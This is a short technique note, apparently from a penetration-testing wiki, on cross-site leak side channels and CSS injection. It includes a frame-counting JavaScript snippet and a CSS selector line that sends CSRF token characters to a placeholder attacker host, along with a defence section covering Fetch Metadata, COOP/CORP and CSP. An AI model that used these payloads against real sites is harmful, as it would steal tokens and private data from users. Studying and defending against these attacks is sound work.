---
title: "XS-Leak & CSS Injection"
type: technique
tags: [client-side, side-channel, xs-leak, css-injection, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-06-16
sources: [payloadsallthethings-xsleak, payloadsallthethings-cssinjection]
---

# XS-Leak & CSS Injection

## What it is

Cross-Site Leaks infer cross-origin secrets from observable browser side effects (timing, frame count, cache, errors) without reading the response body - they bypass SOP by measuring, not reading. CSS Injection exfiltrates data using only CSS, which often survives a CSP that blocks JS. Both are client-side side channels.

## How it works
A page you control loads/queries the target cross-origin and observes a measurable difference that depends on the victim's authenticated state or data (an "oracle"). Repeating the oracle over a search/filter extracts data character by character (XS-Search).

## XS-Leak oracles
- **Frame counting:** `win = window.open(target); win.length` differs by result count.
```javascript
var win = window.open('https://target/search?q=a');
setTimeout(() => console.log(win.length), 2000);   // 0 vs N -> query matched?
```
- **Timing:** response size/complexity -> measurable load time (also via cache).
- **Cache probing:** a resource loads faster if the victim visited a page (presence oracle).
- **Error events:** `onload`/`onerror` on `<img>`/`<script>`/`<link>` reveal status/CORP/X-Frame decisions; `securitypolicyviolation` (CSP) as a boolean oracle.
- **XS-Search:** chain a per-character query (`q=secret_a`, `q=secret_ab`) with any oracle to brute sensitive strings.

## CSS Injection (CSP-safe exfil)
Attribute selectors leak a token char by char by firing a background request on match:
```css
input[name="csrf"][value^="a"]{background:url(https://attacker/?c=a)}
```
- **Sequential import chaining (SIC):** `@import` + long-poll to extract many chars without a reload.
- **font-face `unicode-range`:** detect which characters are present on the page.
- **Ligatures:** a custom font renders a target string as one wide ligature; measure layout width (`fontleak`).
- **`attr()` / `image-set(attr(value))`:** pull an attribute value directly.

## Real-world
XS-Leaks have leaked Gmail/search results and account state across origins; CSS injection has stolen CSRF tokens and 2FA values where a CSP blocked JS. Heavily researched (Google, RUB-NDS).

## Detection and defence
**Fetch Metadata** (`Sec-Fetch-Site`/`-Mode` -> reject cross-site navigations to sensitive endpoints); `SameSite=Lax/Strict` cookies; **COOP/COEP/CORP** + cross-origin isolation (kills window refs/timing); `X-Frame-Options`/`frame-ancestors`; constant-time, result-count-stable responses; for CSS injection, sanitize/disallow user CSS, no untrusted `<style>`/`@import`, and a strict CSP `style-src`.

## Tools
- [RUB-NDS/xsinator.com](https://github.com/RUB-NDS/xsinator.com) - XS-Leak test suite.
- [PortSwigger/css-exfiltration](https://github.com/PortSwigger/css-exfiltration), [adrgs/fontleak](https://github.com/adrgs/fontleak).

## Sources
- PayloadsAllTheThings - XS-Leak / CSS Injection
